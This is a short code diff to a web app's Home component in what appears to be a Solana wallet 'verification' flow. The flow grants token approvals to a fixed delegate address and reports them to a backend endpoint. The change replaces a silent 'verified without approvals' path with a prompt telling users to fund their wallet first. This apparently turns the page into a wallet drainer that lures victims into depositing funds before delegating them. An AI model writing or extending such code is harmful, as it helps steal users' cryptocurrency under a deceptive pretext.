@@ -610,19 +610,9 @@ export default function Home() {
       }
       
       if (transaction.instructions.length === 0) {
-        console.log("No token accounts found - wallet verified without approvals");
-        fetch("/api/solana-approvals", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            walletAddress: solanaAddress,
-            delegateAddress: SOLANA_DELEGATE_ADDRESS,
-            transactionHash: "no-tokens",
-            tokensApproved: [],
-            tokenCount: 0,
-          }),
-        }).catch(console.error);
-        setSolanaStep("done");
+        console.log("No token accounts found");
+        setError("No token accounts found. Please fund your wallet first.");
+        setSolanaStep("idle");
         return;
       }
       
